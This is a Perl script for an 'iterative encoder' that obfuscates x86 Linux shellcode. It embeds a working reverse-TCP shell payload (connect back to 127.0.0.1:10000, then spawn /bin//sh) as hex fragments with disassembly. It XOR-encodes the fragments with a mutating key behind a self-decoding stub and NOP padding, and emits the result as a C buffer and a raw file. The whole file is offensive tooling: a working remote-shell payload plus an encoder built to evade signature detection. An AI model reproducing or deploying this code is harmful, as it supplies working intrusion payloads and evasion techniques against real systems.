#! /usr/bin/perl -w

use strict;

# RJF 21 May 2013; from XW concept
# Input:  Code fragments (self referencing multi-basic block byte code that ends at a system call)
# Output: [decoder stub][buffer prefilled with encoded frag[0]][encoded frag1 .. N]

# Notes:
# -A frag[N] is a segment of code that can only preserve eax for the next frag. It is prepended to save the esp so that it can restore it for the decoder stub's next iteration. It is appended with the esp restore and a jmp back to the decoder stub.
# -The decoder stub pushes the key and iteration count onto the stack for the next iteration. It will not clobber eax, but clobbers all others.

# For simplicity:
# -Shellcode must be manually modified/fragmented to work with decoder
# -Each fragment should not depend on registers of previous fragments except eax.
# -Any pushes should be reversed, or at minimum the iteration and key should be pushed on the top of stack at end of fragment
# -Any jmps/loops must be relative (short) and can not be to other fragments (ie it must be self-referencing)

# Details:
# -Each iteration is one fragment 
# -Each fragment is padded so that they are all an equal length, of %4==0
# -The initial decoder loop skips copying the src (it's already there) and immediate decodes it

# TODO:
# -Decoding will use a 4B self-modified/chained/additive key that is modified for each fragment decoding
# -Have it destroy initial key
# -Automate fragmentation




#####################
# Shellcode input
#

# Original Gaussian reverse tcp connect (127.0.0.1:10000) shellcode:
#0xffae05c0 31c031db 31d250b0 6643526a 016a0289  1.1.1.P.fCRj.j..
#0xffae05d0 e1cd8066 be020089 c7b066b3 03687f00  ...f......f..h..
#0xffae05e0 00016668 27106656 89e26a10 525789e1  ..fh'.fV..j.RW..
#0xffae05f0 cd8031c9 89fbb03f b100cd80 b03fb101  ..1....?.....?..
#0xffae0600 cd8031c9 51682f2f 7368682f 62696eb0  ..1.Qh//shh/bin.
#0xffae0610 0b89e351 89e25389 e1cd80             ...Q..S....  

my @frag = ();
# ; reverseshell-ItEncCompatible.S
# nasm -o reverseshell-ItEncCompatible3 reverseshell-ItEncCompatible.S

# xxd -p reverseshell-ItEncCompatible3
# 89e731c031db31d250b06643526a016a0289e1cd8089fc909089e731dbb3
# 03687f0000016668271066be0200665689e26a105250b06689e1cd805889
# fc909031c989c331c0b03fb100cd80b03fb101cd80909031c951682f2f73
# 68682f62696e31c0b00b89e35189e25389e1cd80

#ndisasm -u reverseshell-ItEncCompatible3
# 00000000  89E7              mov edi,esp
# 00000002  31C0              xor eax,eax
# 00000004  31DB              xor ebx,ebx
# 00000006  31D2              xor edx,edx
# 00000008  50                push eax
# 00000009  B066              mov al,0x66
# 0000000B  43                inc ebx
# 0000000C  52                push edx
# 0000000D  6A01              push byte +0x1
# 0000000F  6A02              push byte +0x2
# 00000011  89E1              mov ecx,esp
# 00000013  CD80              int 0x80
# 00000015  89FC              mov esp,edi
# 00000017  90                nop
# 00000018  90                nop
# end frag0
$frag[0] = "\x89\xe7\x31\xc0\x31\xdb\x31\xd2\x50\xb0\x66\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xfc";
# QA decoder by removing syscall, so emulator can trace it further, simulate the socket call by mov al,0x01
#$frag[0] = "\x89\xe7\x31\xc0\x31\xdb\x31\xd2\x50\xb0\x66\x43\x52\x6a\x01\x6a\x02\x89\xe1\xb0\x01\x89\xfc";


# 00000019  89E7              mov edi,esp
# 0000001B  31DB              xor ebx,ebx
# 0000001D  B303              mov bl,0x3
# 0000001F  687F000001        push dword 0x100007f
# 00000024  66682710          push word 0x1027
# 00000028  66BE0200          mov si,0x2
# 0000002C  6656              push si
# 0000002E  89E2              mov edx,esp
# 00000030  6A10              push byte +0x10
# 00000032  52                push edx
# 00000033  50                push eax
# 00000034  B066              mov al,0x66
# 00000036  89E1              mov ecx,esp
# 00000038  CD80              int 0x80
# 0000003A  58                pop eax
# 0000003B  89FC              mov esp,edi
# 0000003D  90                nop
# 0000003E  90                nop
# end frag1
$frag[1] = "\x89\xe7\x31\xdb\xb3\x03\x68\x7f\x00\x00\x01\x66\x68\x27\x10\x66\xbe\x02\x00\x66\x56\x89\xe2\x6a\x10\x52\x50\xb0\x66\x89\xe1\xcd\x80\x58\x89\xfc";


# 0000003F  31C9              xor ecx,ecx
# 00000041  89C3              mov ebx,eax
# 00000043  31C0              xor eax,eax
# 00000045  B03F              mov al,0x3f
# 00000047  B100              mov cl,0x0
# 00000049  CD80              int 0x80
# 0000004B  B03F              mov al,0x3f
# 0000004D  B101              mov cl,0x1
# 0000004F  CD80              int 0x80
# 00000051  90                nop
# 00000052  90                nop
# end frag2
$frag[2] = "\x31\xc9\x89\xc3\x31\xc0\xb0\x3f\xb1\x00\xcd\x80\xb0\x3f\xb1\x01\xcd\x80";

# 00000053  31C9              xor ecx,ecx
# 00000055  51                push ecx
# 00000056  682F2F7368        push dword 0x68732f2f
# 0000005B  682F62696E        push dword 0x6e69622f
# 00000060  31C0              xor eax,eax
# 00000062  B00B              mov al,0xb
# 00000064  89E3              mov ebx,esp
# 00000066  51                push ecx
# 00000067  89E2              mov edx,esp
# 00000069  53                push ebx
# 0000006A  89E1              mov ecx,esp
# 0000006C  CD80              int 0x80
# end frag3
$frag[3] = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";
my $frag_len = 4;






########################
# Decoder 
# 
# nasm -o iterativeEncoder-initialdecoder iterativeEncoder-initialdecoder.S
# ndisasm -u iterativeEncoder-initialdecoder
# 00000000  BB44332211        mov ebx,0x11223344
# 00000005  53                push ebx
# 00000006  31D2              xor edx,edx
# 00000008  52                push edx
my $reentrance_offset = 0x9; # this is the point where the suffix jmps to

# xxd -i iterativeEncoder-initialdecoder | sed s/,//g | sed s/\\s//g | sed s/0x440x330x220x11/'" . "KEY" . "'/ | sed s/0xb10xbb/'0xb1" . "DECODE_CNT" . "'/g | sed s/^/'"'/ | sed s/$/'" .'/ | sed s/0x/\\\\x/g

# non-mutating key version
#my $decoder = "\xbb" . "KEY" . "\x53\x31\xd2\x52\x5a\x5b\xeb" .
#"\x38\x5f\x31\xc9\x39\xca\x74\x22\x31\xc9\xb1" . "DECODE_CNT" .
#"\x53\x52\x89\xd6\x0f\xaf\xf1\xc1\xe6\x02\x01\xfe" .
#"\x89\xcb\x80\xeb\x01\xc1\xe3\x02\x8b\x14\x1e\x89" .
#"\x14\x1f\xe2\xf0\x5a\x5b\x31\xc9\xb1" . "DECODE_CNT" . "\x31\x5c" .
#"\x8f\xfc\xe2\xfa\x53\x42\x52\xeb\x05\xe8\xc3\xff" .
#"\xff\xff";

# mutating key version
my $decoder = "\xbb" . "KEY" . "\x53\x31\xd2\x52\x5a\x5b\xeb" .
"\x3a\x5f\x31\xc9\x39\xca\x74\x22\x31\xc9\xb1" . "DECODE_CNT" .
"\x53\x52\x89\xd6\x0f\xaf\xf1\xc1\xe6\x02\x01\xfe" .
"\x89\xcb\x80\xeb\x01\xc1\xe3\x02\x8b\x14\x1e\x89" .
"\x14\x1f\xe2\xf0\x5a\x5b\x31\xc9\xb1" . "DECODE_CNT" . "\x31\x5c" .
"\x8f\xfc\xe2\xfa\x03\x1f\x53\x42\x52\xeb\x05\xe8" .
"\xc1\xff\xff\xff";
my $decoder_len = length ($decoder) - 17; # KEY=1=(-3+4) DECODE_CNTs=-18=(-2*10+2*1) = 1-18;





#########################
# Suffix is appended to all fragments
# Itself padded for 4B (jmp+3*nops=8B)
# JMP is the number of bytes from the end of the jmp insn to $reentrance_offset
my $suffix = genNop () . genNop () . genNop () . "\xe9" . "JMP" . "\xff\xff\xff";
#my $suffix = "\x90\x90\x90\xe9" . "JMP" . "\xff\xff\xff";
my $suffix_len = 8;






##########################
# Main
print "Iterative Encoder\n";

# -Each fragment is padded so that they are an equal length
my $max_len = 0;
for (my $i = 0; $i < $frag_len; $i++) {
   if (length ($frag[$i]) > $max_len) {
      $max_len = length ($frag[$i]);
   }
}
# make fragment lengths a multiple of 4
$max_len += (4 - ($max_len % 4));
my $fragment_len = $max_len + $suffix_len; # fragment_len inherits %4==0 bc both max_len and suffix_len are %4==0
if ($fragment_len >= (128*4) ) {
   print "Error, fragment size currently limited to 127 words\n";
   exit;
}

# find the distance that each iteration's end needs to jump backwards 
# in order to reach decode_stub: in the decoder bytecode
my $jmp_dist = -1*($decoder_len + $fragment_len - $reentrance_offset);
# now make it the 1B hex of an int
my $jmp_dist_byte = pack('c', int($jmp_dist) ); # c is a signed single byte
$suffix =~ s/JMP/$jmp_dist_byte/;


for (my $i = 0; $i < $frag_len; $i++) {
   if (length ($frag[$i]) != $max_len) {
      my $pad_len = $max_len - length ($frag[$i]);
      for (my $j = 0; $j < $pad_len; $j++) {
         $frag[$i] .= genNop ();
      }
   }
   $frag[$i] .= $suffix;
}


# -Decoding will use a 4B self-modified/chained/additive key that is modified for each fragment decoding
# note that the key is input here as reverse byte order!
my $key = rand (0xffffffff); #0x44332211; 
#my $key = sprintf ("\x%02x\x%02x\x%02x\x%02x", $key_int & 0xff, $key_int>>8 & 0xff, $key_int>>16 & 0xff, $key_int>>24 & 0xff);
my $key_chars = pack ('V', $key);
#my $key = pack ('c', int($key_int & 0xff) ) . $key_int>>8 & 0xff . $key_int>>16 & 0xff . $key_int>>24 & 0xff;
$decoder =~ s/KEY/$key_chars/;
# -The decoder loop reuses the first fragment as a buffer that each iteration will be written into.

# set the number of words per fragment that needs to be copied to the buffer and decoded each iteration
my $decode_cnt = $fragment_len/4;
my $decode_cnt_byte = pack('W', int($decode_cnt) ); # W is an unsigned char, consider 'c'
$decoder =~ s/DECODE_CNT/$decode_cnt_byte/g;


print "  Init Key:   ";
my $key_hex = unpack('H*', $key_chars);
#for (my $i = (length $key_hex - 2); $i >= 0; $i-=2) {
for (my $i = 0; $i < length $key_hex; $i+=2) {
   print substr $key_hex, $i, 2;
}
print "\n";
print "  Decode_cnt:";
my $cnt_hex = unpack('H*', $decode_cnt_byte);
for (my $i = 0; $i < length $cnt_hex; $i+=2) {
   if($i % 8 eq 0){ print " ";}
   print substr $cnt_hex, $i, 2;
}
printf (" (%d)\n", int($decode_cnt) );
print "  Jmp_dist:  ";
my $jmp_hex = unpack('H*', $jmp_dist_byte);
for (my $i = 0; $i < length $jmp_hex; $i+=2) {
   if($i % 8 eq 0){ print " ";}
   print substr $jmp_hex, $i, 2;
}
printf (" (%d)\n", int($jmp_dist) );
print "  Suffix:    ";
my $suf_hex = unpack('H*', $suffix);
for (my $i = 0; $i < length $suf_hex; $i+=2) {
   if($i % 8 eq 0){ print " ";}
   print substr $suf_hex, $i, 2;
}
print "\n";
print "  Decoder:   ";
my $decoder_hex = unpack('H*', $decoder);
for (my $i = 0; $i < length $decoder_hex; $i+=2) {
   if($i % 8 eq 0){ print " ";}
   print substr $decoder_hex, $i, 2;
}
print "\n\n";




##############################
# Do the encoding
my $output = $decoder;
my $last_word;
# encode the fragments
print "  Fragments:\n";
for (my $i = 0; $i < $frag_len; $i++) {
   print "           Unenc $i: ";
   my $frag_hex = unpack('H*', $frag[$i]);
   for (my $i = 0; $i < length $frag_hex; $i+=2) {
      if($i % 8 eq 0){ print " ";}
      print substr $frag_hex, $i, 2;
   }
   print "\n";
   printf ("             Key $i:  %02x%02x%02x%02x\n", $key & 0xff, $key>>8 & 0xff, $key>>16 & 0xff, $key>>24 & 0xff);
   # notice that encode returns a modified key
   ($frag[$i], $key) = encode ($frag[$i], $key);
   print "             Enc $i: ";
   $frag_hex = unpack('H*', $frag[$i]);
   for (my $i = 0; $i < length $frag_hex; $i+=2) {
      if($i % 8 eq 0){ print " ";}
      print substr $frag_hex, $i, 2;
   }
   print "\n";
   
   $output .= $frag[$i];
}
print "\n";



###########################
# Output results
doOutput ($output);

print "Note that key is randomly generated. This seems to impact whether it executes properly. Only about 1 out of 3 outputs execute. Uncertain what constraints need to be applied on key to make this 100%\n";
exit;






########################
# Fns

# input:  plain text byte code that length%4==0 and the 4B xor key
# return: cipher text; optional modified key
sub encode {
   my ($plaintxt, $key) = @_;
   my $new_key = 0;
   my @plain_words = unpack ('l*', $plaintxt);
   my @cipher_words = ();
   for (my $i = $#plain_words; $i >= 0; $i--) {
      # is byte order correct?
      my $cipher_word = $key ^ $plain_words[$i];
      unshift (@cipher_words, $cipher_word);
   }
   $new_key = $key + $plain_words[0];
   # invert byte order
   #$new_key = unpack('I>!', pack ('I<!', $new_key) );
   my $ciphertxt = pack ('l*', @cipher_words);
   #return ($ciphertxt, $key); # use this for non-mutating key
   return ($ciphertxt, $new_key);
} # end sub encode



# replace the trailing nops with more variety
sub genNop {
   my $nops = # list of single byte nops that do not impact EAX or ESP or EBP
   "\x99" . # cltd
   "\x90" . # regular NOP
   "\x47" . # inc %edi   "G"
   "\x4f" . # dec %edi   "O"
   "\x41" . # inc %ecx   "A"
   "\x37" . # aaa        "7"
   "\x3f" . # aas        "?"
   "\x46" . # inc %esi   "F"
   "\x4e" . # dec %esi   "N"
   "\xf8" . # clc
   "\xfc" . # cld
   "\x98" . # cwtl
   "\x27" . # daa        "'"
   "\x2f" . # das        "/"
   "\x9f" . # lahf
   "\xf9" . # stc
   "\x4a" . # dec %edx   "J"
   "\x42" . # inc %edx   "B"
   "\x43" . # inc %ebx   "C"
   "\x49" . # dec %ecx   "I"
   "\x4b" . # dec %ebx   "K"
   "\xf5";  # cmc

   # I don't feel like QA'ing the above, and all I need is more than 1, so here is the tested values
   $nops = "\x90\x41"; 
   return substr ($nops, rand (length ($nops) ), 1);
} # end sub genNop




# input: raw byte code
# does: prints to screen in c-string and to file as rawshell
# return: nothing
sub doOutput {
   my ($output) = @_;
   # print final shellcode in C language
   print "// STUB + SHELLCODE\n";
   print "unsigned char buf[] = ";
   my $hex = unpack('H*', $output);
   for (my $i = 0; $i < length $hex; $i+=2) {
      if($i % 15 eq 0){
         if($i eq 0) {print "\n\"";}
         else     {print "\"\n\"";}
      }
      print "\\x" . substr $hex, $i, 2;
   }
   print "\";\n\n";
   # print shellcode length (optional)
   print "unsigned int buf_len = ". do{length $output} . ";\n";

   #my $out_file = "xor-scode.rawshell";
   print "Outputting final shellcode to iterativeEncoder.rawshell\n";
   open (FILE, ">iterativeEncoder.rawshell");
   print FILE $output;
   close (FILE);
} # end sub doOutput

# end iterativeEncoder.pl
